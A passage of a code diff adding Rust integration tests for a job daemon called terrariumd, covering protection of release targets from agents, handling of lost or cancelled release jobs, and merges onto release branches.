+    let alias = "name = \"alias\"\n[[targets]]\nname = \"rel-alias\"\nkind = \"ssh\"\naddress = \"other@10.9.0.4\"\nport = 2252\n";
+    let r = td
+        .post_as(&sys, "/api/fleet/apply", apply(alias.into(), false))
+        .await;
+    assert_eq!(r.status, 403, "alias: {}", r.body);
+    assert!(r.body.to_string().contains(rule), "{}", r.body);
+    let t = td.get("/api/targets/rel-fleet").await.ok().clone();
+    assert_eq!(t["address"], "release@10.9.0.4", "{t:#}");
+    // The operator passes.
+    let r = td
+        .post(
+            "/api/fleet/apply",
+            apply(fleet("release@10.9.0.4", 2253), false),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+}
+
+/// TER-623 round 4 (review-ter-623-r3 finding 2): the protection of a
+/// release target outlives the config. After a switch from A to B, and
+/// after a clear, A, B and their machines stay refused for agents (policy,
+/// lease, target change, alias). Only the operator retires an entry, and
+/// not the current release target; then the target is free again.
+#[tokio::test]
+async fn a_release_target_stays_protected_until_the_operator_retires_it() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    let sys = td.agent("p", "sys", json!({"roles": ["sysadmin"]})).await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    for (name, ip) in [("rel-a", "10.9.0.5"), ("rel-b", "10.9.0.6")] {
+        let r = td
+            .post(
+                "/api/targets",
+                json!({"name": name, "kind": "ssh", "address": format!("release@{ip}"), "port": 2252}),
+            )
+            .await;
+        assert_eq!(r.status, 201, "{}", r.body);
+    }
+    let set = |release: Option<&str>| {
+        let mut c = json!({"target": "p-box", "recipe": "true"});
+        if let Some(r) = release {
+            c["release_target"] = json!(r);
+        }
+        c
+    };
+    let rule = "release target runs release jobs only";
+    let w1 = format!("/api/agents/{}", lab.w1);
+    let refused = |target: &'static str, ip: &'static str| {
+        let (w1, sys) = (w1.clone(), sys.clone());
+        async move {
+            let r = td
+                .patch(&w1, json!({"policy": {"targets": [target]}}))
+                .await;
+            assert_eq!(r.status, 403, "{target} policy: {}", r.body);
+            assert!(r.body.to_string().contains(rule), "{}", r.body);
+            let r = td
+                .post(
+                    &format!("/api/targets/{target}/leases"),
+                    json!({"agent": "p/w1"}),
+                )
+                .await;
+            assert_eq!(r.status, 403, "{target} lease: {}", r.body);
+            let r = td
+                .patch_as(
+                    &sys,
+                    &format!("/api/targets/{target}"),
+                    json!({"port": 2299}),
+                )
+                .await;
+            assert_eq!(r.status, 403, "{target} patch: {}", r.body);
+            let r = td
+                .post_as(
+                    &sys,
+                    "/api/targets",
+                    json!({"name": format!("{target}-alias"), "kind": "ssh",
+                           "address": format!("other@{ip}"), "port": 2252}),
+                )
+                .await;
+            assert_eq!(r.status, 403, "{target} alias: {}", r.body);
+        }
+    };
+    let r = td.put("/api/projects/p/delivery", set(Some("rel-a"))).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    // The switch to B.
+    let r = td.put("/api/projects/p/delivery", set(Some("rel-b"))).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    refused("rel-a", "10.9.0.5").await;
+    refused("rel-b", "10.9.0.6").await;
+    let list = td.get("/api/release-targets").await.ok().to_string();
+    assert!(list.contains("rel-a") && list.contains("rel-b"), "{list}");
+    // The current release target is not retired.
+    let r = td.delete("/api/release-targets/rel-b").await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    // The clear.
+    let r = td.put("/api/projects/p/delivery", set(None)).await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    refused("rel-a", "10.9.0.5").await;
+    refused("rel-b", "10.9.0.6").await;
+    // Only the operator retires an entry.
+    let r = td
+        .req(
+            hyper::Method::DELETE,
+            "/api/release-targets/rel-a",
+            None,
+            Some(&lab.lead),
+        )
+        .await;
+    assert_eq!(r.status, 403, "{}", r.body);
+    let r = td.delete("/api/release-targets/rel-a").await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td
+        .patch(&w1, json!({"policy": {"targets": ["rel-a"]}}))
+        .await;
+    assert_eq!(r.status, 200, "rel-a after its retire: {}", r.body);
+    let r = td
+        .patch(&w1, json!({"policy": {"targets": ["rel-b"]}}))
+        .await;
+    assert_eq!(r.status, 403, "rel-b is still protected: {}", r.body);
+    let audit = td.get("/api/audit").await.ok().to_string();
+    assert!(audit.contains("release_target.retire"), "{audit}");
+}
+
+/// TER-623 round 5 (review-ter-623-r4 F1): ordinary jobs stay off a
+/// protected release target. After a switch and after a clear, a sysadmin
+/// agent cannot make the old release target, or a target on its machine,
+/// the job target. A validate job queued before its target got protected
+/// is refused at dispatch, and its recipe never starts.
+#[tokio::test]
+async fn ordinary_jobs_stay_off_a_protected_release_target() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    release_client(&lab, "rel-a").await;
+    let sys = td.agent("p", "sys", json!({"roles": ["sysadmin"]})).await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    for t in [
+        json!({"name": "rel-b", "kind": "ssh", "address": "release@10.9.0.7", "port": 2252}),
+        json!({"name": "rel-a-alias", "kind": "host", "host": "lab2"}),
+    ] {
+        let r = td.post("/api/targets", t).await;
+        assert_eq!(r.status, 201, "{}", r.body);
+    }
+    let marks = tempfile::tempdir().unwrap();
+    let m = marks.path().display().to_string();
+    let recipe = format!("touch \"{m}/started-$TERRARIUM_JOB_ID\"; sleep 600");
+    let config = |target: &str, release: Option<&str>| {
+        let mut c = json!({"target": target, "recipe": recipe, "slots": 1, "next_repos": ["app"],
+                           "work_dir": lab._dirs.path().join("jobs")});
+        if let Some(r) = release {
+            c["release_target"] = json!(r);
+        }
+        c
+    };
+    let r = td
+        .put("/api/projects/p/delivery", config("p-box", Some("rel-a")))
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let rule = "release target runs release jobs only";
+    // The switch to rel-b, then the clear: rel-a and its machine stay off.
+    for release in [Some("rel-b"), None] {
+        let r = td
+            .put("/api/projects/p/delivery", config("p-box", release))
+            .await;
+        assert_eq!(r.status, 200, "{}", r.body);
+        for target in ["rel-a", "rel-a-alias"] {
+            let r = td
+                .put_as(&sys, "/api/projects/p/delivery", config(target, release))
+                .await;
+            assert_eq!(r.status, 403, "{target} after {release:?}: {}", r.body);
+            assert!(r.body.to_string().contains(rule), "{}", r.body);
+        }
+    }
+    // Two validate jobs on p-box: the first holds the one slot, the second
+    // waits. Then the operator moves rel-a onto lab1, the machine of p-box.
+    let started = |id: &str| marks.path().join(format!("started-{id}")).exists();
+    let l = &lab;
+    let validate = move |branch: &'static str| async move {
+        let head = l.branch(branch, "next", &[("OK", "yes\n")]);
+        let card = l.card(branch, branch).await;
+        let r =
+            l.td.post_as(
+                &l.w1,
+                &format!("/api/cards/{card}/validate"),
+                json!({"commit": head}),
+            )
+            .await;
+        assert_eq!(r.status, 201, "{}", r.body);
+        (card, r.body["job"]["id"].as_str().unwrap().to_owned())
+    };
+    let (_, first) = validate("ter-p1").await;
+    let start = Instant::now();
+    while !started(&first) {
+        assert!(start.elapsed() < DEADLINE, "the first job never started");
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    let (second_card, second) = validate("ter-p2").await;
+    let r = td
+        .patch("/api/targets/rel-a", json!({"host": "lab1"}))
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let r = td.delete(&format!("/api/jobs/{first}")).await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let jobs = lab.until_idle().await;
+    let mine: Vec<&Value> = jobs
+        .iter()
+        .filter(|j| j["card"] == second_card.as_str())
+        .collect();
+    assert!(!mine.is_empty(), "{jobs:#?}");
+    for j in &mine {
+        assert_eq!(j["state"], "failed", "{j:#}");
+        assert!(
+            !started(j["id"].as_str().unwrap()),
+            "a job ran on the protected machine: {j:#}"
+        );
+        let detail = td
+            .get(&format!("/api/jobs/{}", j["id"].as_str().unwrap()))
+            .await
+            .ok()
+            .to_string();
+        assert!(detail.contains(rule), "{detail}");
+    }
+    assert!(!started(&second));
+}
+
+/// TER-623 round 5 (review-ter-623-r4 F2): a PATCH or DELETE of a target
+/// rechecks the release rule in its write. A sysadmin agent's PATCH and
+/// DELETE, read before the operator made the target the release target,
+/// are refused at the write, and the target keeps its definition.
+#[tokio::test]
+async fn a_target_write_read_before_the_protection_is_refused_at_its_write() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    release_client(&lab, "rel-c").await;
+    let sys = td.agent("p", "sys", json!({"roles": ["sysadmin"]})).await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "rel-d", "kind": "ssh", "address": "release@10.9.0.8", "port": 2252}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let rule = "release target runs release jobs only";
+    let l = &lab;
+    let protect = move |release: &'static str| async move {
+        let r =
+            l.td.put(
+                "/api/projects/p/delivery",
+                json!({"target": "p-box", "recipe": "true", "release_target": release}),
+            )
+            .await;
+        assert_eq!(r.status, 200, "{}", r.body);
+    };
+    // The PATCH.
+    let (ready, go) = terrariumd::jobs::pause_next_target_write("rel-c");
+    let (patch, ()) = tokio::join!(
+        td.patch_as(&sys, "/api/targets/rel-c", json!({"host": "lab1"})),
+        async {
+            ready.await.unwrap();
+            protect("rel-c").await;
+            go.send(()).unwrap();
+        }
+    );
+    assert_eq!(patch.status, 403, "{}", patch.body);
+    assert!(patch.body.to_string().contains(rule), "{}", patch.body);
+    let t = td.get("/api/targets/rel-c").await.ok().clone();
+    assert_eq!(t["host"], "lab2", "{t:#}");
+    // The DELETE.
+    let (ready, go) = terrariumd::jobs::pause_next_target_write("rel-d");
+    let (del, ()) = tokio::join!(
+        td.req(
+            hyper::Method::DELETE,
+            "/api/targets/rel-d",
+            None,
+            Some(&sys)
+        ),
+        async {
+            ready.await.unwrap();
+            protect("rel-d").await;
+            go.send(()).unwrap();
+        }
+    );
+    assert_eq!(del.status, 403, "{}", del.body);
+    assert!(del.body.to_string().contains(rule), "{}", del.body);
+    let r = td.get("/api/targets/rel-d").await;
+    assert_eq!(
+        r.status, 200,
+        "the protected target was deleted: {}",
+        r.body
+    );
+}
+
+/// TER-623, review-ter-623 F3: a release never runs again by itself. A run
+/// that the host agent lost, a release that was running when the daemon
+/// stopped, and a cancel of a running release each end the job (failed or
+/// cancelled) with no requeue and no second start of the recipe.
+#[tokio::test]
+async fn a_lost_or_cancelled_release_never_runs_again() {
+    let lab = lab(1).await;
+    let td = &lab.td;
+    let state = td.daemon.as_ref().unwrap().state.clone();
+    // The release client on lab1 (restarted below), the job target on lab2.
+    let r = td.post("/api/hosts", json!({"name": "lab2"})).await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let token = r.body["token"].as_str().unwrap().to_owned();
+    let r = td
+        .post(
+            "/api/targets",
+            json!({"name": "p-two", "kind": "host", "host": "lab2", "project": "p"}),
+        )
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    connect_host(
+        td,
+        lab.hosts_addr,
+        "lab2",
+        &token,
+        &lab._dirs.path().join("lab2"),
+        None,
+    )
+    .await;
+    let marks = tempfile::tempdir().unwrap();
+    let m = marks.path().display().to_string();
+    let r = td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-two", "recipe": "true", "next_repos": ["app"],
+                   "work_dir": lab._dirs.path().join("jobs"),
+                   "release_target": "gbox",
+                   "release_recipe": format!(
+                       "echo \"$TERRARIUM_JOB_ID\" >> '{m}/runs'; touch \"{m}/ran-$TERRARIUM_JOB_ID\"; sleep 600")}),
+        )
+        .await;
+    assert_eq!(r.status, 200, "{}", r.body);
+    let runs = || {
+        std::fs::read_to_string(marks.path().join("runs"))
+            .unwrap_or_default()
+            .lines()
+            .count()
+    };
+    let l = &lab;
+    let dir = marks.path().to_path_buf();
+    let wait_ran = |id: String| {
+        let p = dir.join(format!("ran-{id}"));
+        async move {
+            let start = Instant::now();
+            while !p.exists() {
+                if start.elapsed() > DEADLINE {
+                    let j = l.td.get(&format!("/api/jobs/{id}")).await.ok().clone();
+                    panic!("the release recipe never started: {j:#}");
+                }
+                tokio::time::sleep(Duration::from_millis(50)).await;
+            }
+        }
+    };
+    let ended = move |id: String| async move {
+        let start = Instant::now();
+        loop {
+            let j = l.td.get(&format!("/api/jobs/{id}")).await.ok().clone();
+            if j["state"] != "running" && j["state"] != "queued" {
+                return j;
+            }
+            assert!(start.elapsed() < DEADLINE, "the job never ended: {j:#}");
+            tokio::time::sleep(Duration::from_millis(50)).await;
+        }
+    };
+    let card = lab.card("v3", "v3").await;
+    let c = card.clone();
+    let release = move || {
+        let c = c.clone();
+        async move {
+            let r =
+                l.td.post_as(&l.lead, &format!("/api/cards/{c}/release"), json!({}))
+                    .await;
+            assert_eq!(r.status, 201, "{}", r.body);
+            r.body["job"]["id"].as_str().unwrap().to_owned()
+        }
+    };
+
+    // 1. The host agent restarts while the recipe runs: the run is lost.
+    let id = release().await;
+    wait_ran(id.clone()).await;
+    lab.agent_down().await;
+    lab.agent_up().await;
+    let j = ended(id.clone()).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    assert_eq!(j["outcome"], "error", "{j:#}");
+    assert!(
+        j["tail"]
+            .as_str()
+            .unwrap()
+            .contains("does not run again by itself"),
+        "{j:#}"
+    );
+    assert_eq!(j["attempt"], 1, "{j:#}");
+
+    // 2. A release that was running when the daemon stopped.
+    let lost = ulid::Ulid::new().to_string();
+    let (lid, lcard) = (lost.clone(), card.clone());
+    let at = chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true);
+    state
+        .db
+        .write("operator", move |t| {
+            t.execute(
+                "INSERT INTO jobs (id, project, card, kind, repo, branch, state, attempt,
+                                   created_by, created_at, started_at, slot)
+                 VALUES (?1, 'p', ?2, 'release', 'app', 'main', 'running', 1, 't', ?3, ?3, -1)",
+                rusqlite::params![lid, lcard, at],
+            )?;
+            Ok(())
+        })
+        .await
+        .unwrap();
+    terrariumd::jobs::recover_lost(&state).await.await.unwrap();
+    let j = ended(lost.clone()).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    assert_eq!(j["outcome"], "error", "{j:#}");
+
+    // 3. A cancel of a running release.
+    let id3 = release().await;
+    wait_ran(id3.clone()).await;
+    let r = td.delete(&format!("/api/jobs/{id3}")).await;
+    assert!(r.status.is_success(), "{} {}", r.status, r.body);
+    let j = ended(id3.clone()).await;
+    assert_eq!(j["state"], "cancelled", "{j:#}");
+
+    // No requeue, no second start: one run each of the two that ran, and
+    // every release job of the card has ended.
+    tokio::time::sleep(Duration::from_millis(1500)).await;
+    terrariumd::jobs::tick(&state).await.unwrap();
+    let jobs = lab.until_idle().await;
+    let mine: Vec<&Value> = jobs.iter().filter(|j| j["card"] == card.as_str()).collect();
+    assert_eq!(mine.len(), 3, "{mine:#?}");
+    assert_eq!(runs(), 2, "a release ran again");
+}
+
 /// Review B1: the recipe commits in its clone and moves HEAD. The push
 /// sends the merge commit that the prepare step recorded, never the
 /// recipe's commit.
@@ -2827,6 +4035,298 @@ async fn a_merge_pushes_the_recorded_commit_not_the_head_after_the_recipe() {
     assert!(!files.lines().any(|f| f == "EVIL"), "{files}");
     let all = git(&lab.origin, &["log", "--all", "--format=%s"]);
     assert!(!all.lines().any(|l| l == "evil"), "{all}");
+}
+
+/// Queue a merge of card `id` (`onto`: a release branch, else `next`) as
+/// the lead, and wait until the queue is idle: the newest job of the card.
+async fn merge_and_wait(lab: &Lab, id: &str, onto: Option<&str>) -> Value {
+    let body = onto.map_or_else(|| json!({}), |o| json!({"onto": o}));
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{id}/merge"), body)
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    let job_id = r.body["job"]["id"].as_str().unwrap().to_owned();
+    let jobs = lab.until_idle().await;
+    let mut of_card: Vec<Value> = jobs
+        .into_iter()
+        .filter(|j| j["card"] == id && j["onto"] == r.body["job"]["onto"])
+        .collect();
+    // A failed job may have a rerun: the newest is first.
+    assert!(
+        of_card.iter().any(|j| j["id"] == job_id.as_str()),
+        "{of_card:#?}"
+    );
+    let newest = of_card.remove(0);
+    let id = newest["id"].as_str().unwrap();
+    lab.td.get(&format!("/api/jobs/{id}")).await.ok().clone()
+}
+
+/// TER-607: `card merge --onto release/X.Y.Z` merges the commit that the
+/// card's passed merge onto `next` took onto that release branch and
+/// pushes it there; `next` stays. A branch that is not `next` or
+/// `release/X.Y.Z` is refused. Review round 2: a card without a passed
+/// merge onto `next` gets a 409 (finding 1); a push to the branch after
+/// that merge does not reach the release (finding 1); a fix branch made
+/// from a `next` that moved on is refused, so the frozen version takes no
+/// unreleased card (finding 2).
+#[tokio::test]
+async fn a_merge_onto_a_release_branch_pushes_that_branch_only() {
+    let lab = lab(2).await;
+    lab.td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "test -f OK",
+                   "next_repos": ["app"],
+                   "work_dir": lab._dirs.path().join("jobs").display().to_string()}),
+        )
+        .await
+        .ok();
+    lab.branch("release/1.4.0", "next", &[("FROZEN", "1.4.0\n")]);
+    let frozen = git(&lab.origin, &["rev-parse", "release/1.4.0"]);
+    // `next` moves on: a card that is not in the release merges.
+    lab.branch("ter-other", "next", &[("OK", "yes\n"), ("OTHER", "x\n")]);
+    let other = lab.card("other", "ter-other").await;
+    let j = merge_and_wait(&lab, &other, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+
+    // The fix branch is made from the release branch.
+    let fix = lab.branch("ter-rb1", "release/1.4.0", &[("OK", "yes\n")]);
+    let id = lab.card("ter-rb1", "ter-rb1").await;
+    for bad in ["main", "release/1.4", "release/../next"] {
+        let r = lab
+            .td
+            .post_as(
+                &lab.lead,
+                &format!("/api/cards/{id}/merge"),
+                json!({"onto": bad}),
+            )
+            .await;
+        assert_eq!(r.status, 422, "{bad}: {}", r.body);
+    }
+    // No passed merge onto `next` yet: no tested commit, no head.
+    lab.td
+        .post_as(
+            &lab.lead,
+            &format!("/api/cards/{id}/merge"),
+            json!({"onto": "release/1.4.0"}),
+        )
+        .await
+        .err(409, "conflict");
+    let j = merge_and_wait(&lab, &id, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    let next = git(&lab.origin, &["rev-parse", "next"]);
+    // A push after the merge onto `next` was never tested.
+    let late = lab.branch("ter-rb1", "ter-rb1", &[("EVIL", "x\n")]);
+    assert_ne!(late, fix);
+
+    let j = merge_and_wait(&lab, &id, Some("release/1.4.0")).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    assert_eq!(j["onto"], "release/1.4.0", "{j:#}");
+    let rel = git(&lab.origin, &["rev-parse", "release/1.4.0"]);
+    assert_eq!(j["head"].as_str().unwrap(), rel, "{j:#}");
+    assert_eq!(
+        git(&lab.origin, &["log", "-1", "--format=%s", "release/1.4.0"]),
+        "Merge ter-rb1 onto release/1.4.0"
+    );
+    assert_eq!(git(&lab.origin, &["rev-parse", "release/1.4.0^1"]), frozen);
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "release/1.4.0^2"]),
+        fix,
+        "the tested fix commit, not the later push"
+    );
+    let files = git(&lab.origin, &["ls-tree", "--name-only", "release/1.4.0"]);
+    assert!(
+        !files.lines().any(|f| f == "EVIL" || f == "OTHER"),
+        "{files}"
+    );
+    assert_eq!(git(&lab.origin, &["rev-parse", "next"]), next, "next stays");
+
+    // A fix branch made from `next` brings the other card along.
+    lab.branch("ter-rb2", "next", &[("OK", "rb2\n")]);
+    let rb2 = lab.card("ter-rb2", "ter-rb2").await;
+    let j = merge_and_wait(&lab, &rb2, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    let j = merge_and_wait(&lab, &rb2, Some("release/1.4.0")).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    let tail = j["tail"].as_str().unwrap_or_default();
+    assert!(tail.contains("is not based on `release/1.4.0`"), "{tail}");
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "release/1.4.0"]),
+        rel,
+        "the release stays"
+    );
+}
+
+/// TER-607 review round 3: a card X branched from `next` before the cut
+/// merges onto `next` after it. A fix stacked on X's branch brings X's
+/// own commits (second-parent commits of `next`, not on its first-parent
+/// line), so the merge onto the release is refused and the release stays.
+#[tokio::test]
+async fn a_fix_stacked_on_a_card_merged_after_the_cut_is_refused() {
+    let lab = lab(2).await;
+    lab.td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "test -f OK",
+                   "next_repos": ["app"],
+                   "work_dir": lab._dirs.path().join("jobs").display().to_string()}),
+        )
+        .await
+        .ok();
+    let xwork = lab.branch("ter-x", "next", &[("OK", "yes\n"), ("XWORK", "x\n")]);
+    lab.branch("release/1.4.0", "next", &[("FROZEN", "1.4.0\n")]);
+    let frozen = git(&lab.origin, &["rev-parse", "release/1.4.0"]);
+    let x = lab.card("x", "ter-x").await;
+    let j = merge_and_wait(&lab, &x, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    // The fix is stacked on X's branch.
+    lab.branch("ter-rb3", "ter-x", &[("OK", "rb3\n")]);
+    let rb3 = lab.card("ter-rb3", "ter-rb3").await;
+    let j = merge_and_wait(&lab, &rb3, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    let j = merge_and_wait(&lab, &rb3, Some("release/1.4.0")).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    let tail = j["tail"].as_str().unwrap_or_default();
+    assert!(tail.contains("is not based on `release/1.4.0`"), "{tail}");
+    assert!(tail.contains(&xwork), "names X's commit: {tail}");
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "release/1.4.0"]),
+        frozen,
+        "the release stays"
+    );
+}
+
+/// TER-637 (TER-607 review round 3, minor 1): card X, branched from
+/// `next` before the cut, merges onto `next` after it. Fix F's branch
+/// points at a commit of X's branch with no commit of its own, so F's
+/// merge onto `next` passes with no merge commit, and the oldest
+/// first-parent commit of `next` that holds F is X's merge. The merge of
+/// F onto the release is refused and the release stays.
+#[tokio::test]
+async fn a_fix_whose_next_merge_made_no_commit_is_refused() {
+    let lab = lab(2).await;
+    lab.td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "test -f OK",
+                   "next_repos": ["app"],
+                   "work_dir": lab._dirs.path().join("jobs").display().to_string()}),
+        )
+        .await
+        .ok();
+    let x1 = lab.branch("ter-x", "next", &[("OK", "yes\n"), ("X1", "x\n")]);
+    lab.branch("ter-x", "ter-x", &[("X2", "x\n")]);
+    lab.branch("release/1.4.0", "next", &[("FROZEN", "1.4.0\n")]);
+    let frozen = git(&lab.origin, &["rev-parse", "release/1.4.0"]);
+    let x = lab.card("x", "ter-x").await;
+    let j = merge_and_wait(&lab, &x, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    // F's branch is X's first commit: no commit of its own.
+    git(
+        &lab.work,
+        &["push", "-q", "origin", &format!("{x1}:refs/heads/ter-rb4")],
+    );
+    let next = git(&lab.origin, &["rev-parse", "next"]);
+    let rb4 = lab.card("ter-rb4", "ter-rb4").await;
+    let j = merge_and_wait(&lab, &rb4, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "next"]),
+        next,
+        "a no-op merge"
+    );
+    let j = merge_and_wait(&lab, &rb4, Some("release/1.4.0")).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    let tail = j["tail"].as_str().unwrap_or_default();
+    assert!(tail.contains("which is not its own merge"), "{tail}");
+    assert!(tail.contains(&next), "names X's merge: {tail}");
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "release/1.4.0"]),
+        frozen,
+        "the release stays"
+    );
+}
+
+/// TER-637 (TER-607 review round 3, minor 2): when the first-parent
+/// commit of `next` that holds the tested commit has no first parent (a
+/// `next` rewritten to a root commit), the check cannot see what `next`
+/// held before the fix: the merge onto the release is refused.
+#[tokio::test]
+async fn a_fix_whose_next_merge_has_no_first_parent_is_refused() {
+    let lab = lab(2).await;
+    lab.td
+        .put(
+            "/api/projects/p/delivery",
+            json!({"target": "p-box", "recipe": "test -f OK",
+                   "next_repos": ["app"],
+                   "work_dir": lab._dirs.path().join("jobs").display().to_string()}),
+        )
+        .await
+        .ok();
+    lab.branch("release/1.4.0", "next", &[("FROZEN", "1.4.0\n")]);
+    let frozen = git(&lab.origin, &["rev-parse", "release/1.4.0"]);
+    // A root commit, pushed as `next` and as the fix branch.
+    git(&lab.work, &["checkout", "-q", "--orphan", "ter-rb5"]);
+    std::fs::write(lab.work.join("OK"), "yes\n").unwrap();
+    git(&lab.work, &["add", "-A"]);
+    git(&lab.work, &["commit", "-q", "-m", "root"]);
+    let root = git(&lab.work, &["rev-parse", "HEAD"]);
+    git(
+        &lab.work,
+        &["push", "-q", "-f", "origin", "ter-rb5", "ter-rb5:next"],
+    );
+    let rb5 = lab.card("ter-rb5", "ter-rb5").await;
+    let j = merge_and_wait(&lab, &rb5, None).await;
+    assert_eq!(j["state"], "passed", "{j:#}");
+    assert_eq!(git(&lab.origin, &["rev-parse", "next"]), root);
+    let j = merge_and_wait(&lab, &rb5, Some("release/1.4.0")).await;
+    assert_eq!(j["state"], "failed", "{j:#}");
+    let tail = j["tail"].as_str().unwrap_or_default();
+    assert!(tail.contains("has no first parent"), "{tail}");
+    assert_eq!(
+        git(&lab.origin, &["rev-parse", "release/1.4.0"]),
+        frozen,
+        "the release stays"
+    );
+}
+
+/// TER-607 review round 2, finding 3: a batch of two or more cards with a
+/// release-blocker card is refused; the fix merges alone.
+#[tokio::test]
+async fn a_batch_with_a_release_blocker_card_is_refused() {
+    let lab = lab(2).await;
+    lab.branch("ter-b1", "next", &[("OK", "yes\n"), ("b1", "b1")]);
+    lab.branch("ter-b2", "next", &[("OK", "yes\n"), ("b2", "b2")]);
+    let b1 = lab.card("b1", "ter-b1").await;
+    let b2 = lab.card("b2", "ter-b2").await;
+    lab.td
+        .patch(
+            &format!("/api/cards/{b2}"),
+            json!({"add_labels": ["release-blocker"]}),
+        )
+        .await
+        .ok();
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [b1, b2]}))
+        .await;
+    r.err(409, "conflict");
+    assert!(
+        r.body["error"]["message"]
+            .as_str()
+            .unwrap()
+            .contains("release-blocker"),
+        "{}",
+        r.body
+    );
+    assert!(lab.jobs().await.is_empty());
+    // Alone, it is queued.
+    let r = lab
+        .td
+        .post_as(&lab.lead, "/api/merges", json!({"cards": [b2]}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
 }
 
 /// Review B2: the recipe plants `url.<x>.insteadOf` and `pushInsteadOf`
@@ -3070,13 +4570,14 @@ case "$1" in
   inspect) echo '[{"Id":"abc","Name":"/terrarium-p-dbox","State":{"Status":"running"}}]' ;;
   run) echo abc ;;
   exec) shift
-    while [ $# -gt 0 ]; do case "$1" in -i|-t) shift ;; -w) cd "$2" || exit 1; shift 2 ;; -e|-u) shift 2 ;; *) break ;; esac; done
+    while [ $# -gt 0 ]; do case "$1" in -i|-t) shift ;; -w) cd "$2" || exit 1; shift 2 ;; -e|-u) shift 2 ;;
+      --env-file) while IFS= read -r l; do export "$l"; done < "$2"; shift 2 ;; *) break ;; esac; done
     shift
     # Recovery tests can hold kills before execution, rather than race
     # the five-second TERM grace on a loaded host.
     gate="${0%/*}/kill-gate"
     if [ "$4" = terrarium-kill ] && [ -d "$gate" ]; then
-      touch "$gate/${5##*/}"
+      echo $$ > "$gate/${5##*/}"
       while [ -d "$gate" ]; do sleep 0.02; done
     fi
     # An async list gets /dev/null on stdin: keep the real one (`-i`, the
@@ -3392,9 +4893,15 @@ both_flows!(a_green_batch_of_three_merges_in_one_job);
 /// `accepted`.
 async fn a_green_batch_of_three_merges_in_one_job(flow: &'static str) {
     let lab = lab_flow(2, flow).await;
+    // The job waits for the gate, not a fixed sleep: under load a batch
+    // that ends before the 409 check below lets a new job take card 2.
+    let gate = lab._dirs.path().join("gate");
     set_recipe(
         &lab,
-        "test -f OK && test -f g1 && test -f g2 && test -f g3 && sleep 1",
+        &format!(
+            "{} && test -f OK && test -f g1 && test -f g2 && test -f g3",
+            common::gate_wait(&gate, DEADLINE)
+        ),
     )
     .await;
     let mut heads = Vec::new();
@@ -3472,6 +4979,7 @@ async fn a_green_batch_of_three_merges_in_one_job(flow: &'static str) {
         })
         .await;
     }
+    std::fs::write(&gate, "").unwrap();
     for c in &cards {
         let card = lab
             .until_card(c, "accepted", |c| c["column"] == "accepted")
@@ -4105,12 +5613,34 @@ fn orphan(job: &str) -> (std::process::Child, u32) {
         .nth(19)
         .unwrap()
         .to_owned();
-    std::fs::write(
-        terrariumd::run_kill::job_pidfile(job),
-        format!("{pid} {st}\n"),
-    )
-    .unwrap();
+    std::fs::write(private_job_pidfile(job), format!("{pid} {st}\n")).unwrap();
     (leader, child)
+}
+
+/// The job PID file of `job` where the wrapper of this user writes it
+/// (TER-587), its private directory made.
+fn private_job_pidfile(job: &str) -> String {
+    use std::os::unix::fs::PermissionsExt;
+    let f = terrariumd::run_kill::private_pidfile(
+        &terrariumd::run_kill::job_pidfile(job),
+        nix::unistd::geteuid().as_raw(),
+    );
+    let dir = Path::new(&f).parent().unwrap();
+    std::fs::create_dir_all(dir).unwrap();
+    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+    f
+}
+
+/// Is the held kill of `id` still waiting at the gate? The fake docker
+/// writes its PID into the gate file. Its process ends when the kill
+/// command hits its own timeout (`run_kill::kill_cmd`: grace + 30 s),
+/// and the kill then counts as ended.
+fn kill_still_held(gate: &Path, id: &str) -> bool {
+    let f = terrariumd::run_kill::job_pidfile(id);
+    std::fs::read_to_string(gate.join(Path::new(&f).file_name().unwrap()))
